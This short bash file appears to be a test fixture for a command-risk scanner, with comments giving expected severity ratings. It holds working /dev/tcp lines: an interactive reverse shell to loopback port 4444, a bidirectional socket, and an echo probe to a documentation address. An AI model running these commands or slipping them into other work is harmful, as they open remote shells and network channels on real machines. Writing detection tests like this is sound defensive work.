#!/bin/bash
# Interactive reverse shell to loopback must stay HIGH.
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# Bidirectional /dev/tcp on loopback.
exec 5<>/dev/tcp/127.0.0.1/4444

# echo probe to a non-loopback host.
echo >/dev/tcp/203.0.113.5/9